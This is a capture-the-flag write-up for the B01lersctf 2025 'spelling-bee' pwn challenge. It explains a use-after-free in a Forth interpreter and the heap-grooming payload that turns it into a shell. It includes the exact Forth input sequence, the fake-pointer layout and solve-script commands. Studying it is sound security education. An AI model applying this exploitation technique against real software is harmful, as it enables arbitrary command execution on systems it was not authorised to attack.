---
title: "spelling-bee writeup"
description: "The bug is a use-after-free in the Forth dictionary."
event: "B01lersctf"
year: 2025
category: pwn
tags: ["pwn","heap"]
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "b01lersctf/pwn/spelling-bee/dist/spelling-bee"
featured: false
flagsHidden: false
---

> Imported from [b01lersctf/pwn/spelling-bee/dist/spelling-bee](https://github.com/R3izorr/CTF_writeup/tree/main/b01lersctf/pwn/spelling-bee/dist/spelling-bee).

# spelling-bee writeup

## Main idea

The bug is a use-after-free in the Forth dictionary.

Compiled words store raw `word_t *` pointers to other words. The `forget`
command frees a word even if another compiled word still references it. We keep
a stale pointer to a freed `word_t`, then reallocate that chunk as a controlled
word name. That fake `word_t` makes the interpreter call the leaked `dosys`
function with a command string we planted in heap memory.

Final call:

```c
dosys("sh;#AAAA...");
```

`dosys()` calls `system()`, so this gives a shell.

## Binary

```text
Arch:       amd64
RELRO:      Partial RELRO
Canary:     No canary
NX:         Enabled
PIE:        Enabled
```

The program prints a PIE leak on startup:

```c
printf("%p\n", dosys);
```

So we know the exact runtime address of `dosys`.

## Important structs

```c
typedef struct word {
  long flags;
  long length;
  long referenced_by;
  void (*code)(void *);
  void *param;
} word_t;
```

Layout:

```text
0x00 flags
0x08 length
0x10 referenced_by
0x18 code
0x20 param
```

`sizeof(word_t) == 0x28`, so the malloc chunk is `0x30`.

The interpreter executes words like this:

```c
(*next)->code((*next)->param);
```

If we control a stale `word_t`, we control the function pointer and argument.

## Vulnerability

When compiling a word, references are stored directly:

```c
word->referenced_by += 1;
push_word(&compile_def, word, ...);
```

But `delete_word()` ignores `referenced_by`:

```c
if (w->flags & WF_MALLOC_PARAM) {
  free(w->param);
}
free(w);
free(cur);
```

So this creates a dangling reference:

```forth
: B ;
: A B ;
forget B
```

`A` still contains a pointer to the freed `B word_t`.

## Heap plan

For a user-defined word:

```text
compile_name      controlled size
compile_def       0x90 chunk, array of word_t *
word_t            0x30 chunk
dict_t            0x30 chunk
```

We want:

```text
stale_B->code  = dosys
stale_B->param = pointer to "sh;#AAAA..."
```

The tricky part: the fake `word_t` is written with `strcpy()` into a word name.
That means no embedded NUL bytes. We cannot write both `code` and `param`
directly.

Solution:

1. Leave `B->param` untouched.
2. Reuse old `B->param` chunk for a long word name containing `sh;#AAAA...`.
3. Reuse old `B word_t` chunk for a fake name that only overwrites `code`.

## Payload sequence

```forth
: B ;
: A B ;
forget B
forget drop
: sh;#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 1 ;
: FFFFFFFFFFFFFFFFFFFFFFFF<dosys low 6 bytes> ;
A
```

What each part does:

```text
: B ;
```

Creates victim `B`.

```text
: A B ;
```

Makes `A` contain a raw pointer to `B word_t`.

```text
forget B
```

Frees:

```text
B->param    old compile_def, 0x90
B word_t    stale target, 0x30
B dict_t    0x30
```

But `A` still points at freed `B word_t`.

```text
forget drop
```

Frees two more `0x30` chunks from the primitive word and its dict entry. This is
heap grooming so later allocations consume chunks in the right order.

```text
: sh;#AAA... 1 ;
```

The 127-byte name makes `malloc(strlen(token) + 1)` request 128 bytes, which
reuses old `B->param` (`0x90`). Now:

```text
B->param -> "sh;#AAAA..."
```

The body constant `1`, plus the new word allocation and dict allocation, consume
the three `0x30` chunks above old `B word_t` in tcache. After this, old
`B word_t` is next.

```text
: FFFF...<dosys bytes> ;
```

This name allocation lands on old `B word_t`.

Fake name:

```python
fake = b"F" * 24 + p64(dosys)[:6]
```

Why 24:

```text
word_t.code is at offset 0x18
```

Why only 6 bytes:

```text
x86-64 user pointers are 48-bit canonical.
High two bytes are 00 00.
strcpy() adds a NUL at byte 6 of the pointer.
byte 7 was already 00 from the old function pointer.
```

This overwrites only:

```text
B->code = dosys
```

It does not reach offset `0x20`, so:

```text
B->param still points to "sh;#AAAA..."
```

Finally:

```text
A
```

Runs the stale reference:

```c
B->code(B->param);
```

Which is now:

```c
dosys("sh;#AAAA...");
```

## Why `sh;#AAAA...`

The command string must be 127 bytes long to hit the `0x90` malloc size. It
cannot contain spaces or NUL bytes because input is read with:

```c
fscanf(stdin, "%127s", token);
```

`sh;#AAAA...` works as shell syntax:

```text
sh        start a shell
;         end the command
#AAAA...  comment out the filler
```

## Running

Local:

```bash
./solve.py
```

Local one-shot command:

```bash
./solve.py CMD='cat flag*'
```

Remote:

```bash
./solve.py REMOTE=1
```

The exploit retries if ASLR puts whitespace or NUL bytes in the injected
six-byte `dosys` pointer, because `%127s` would split or truncate the token.

